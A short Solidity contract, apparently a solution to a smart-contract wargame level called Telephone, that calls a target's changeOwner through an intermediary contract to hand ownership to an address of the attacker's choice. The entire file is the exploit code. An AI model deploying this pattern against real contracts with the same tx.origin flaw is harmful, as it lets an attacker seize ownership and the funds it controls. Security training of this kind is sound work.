// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public telephoneContractAddress;
    address newOwner;

    constructor(address _address, address _newOwner) {
        telephoneContractAddress = ITelephone(_address);
        newOwner = _newOwner;
    }

    function attack() public {
        telephoneContractAddress.changeOwner(newOwner);
    }
}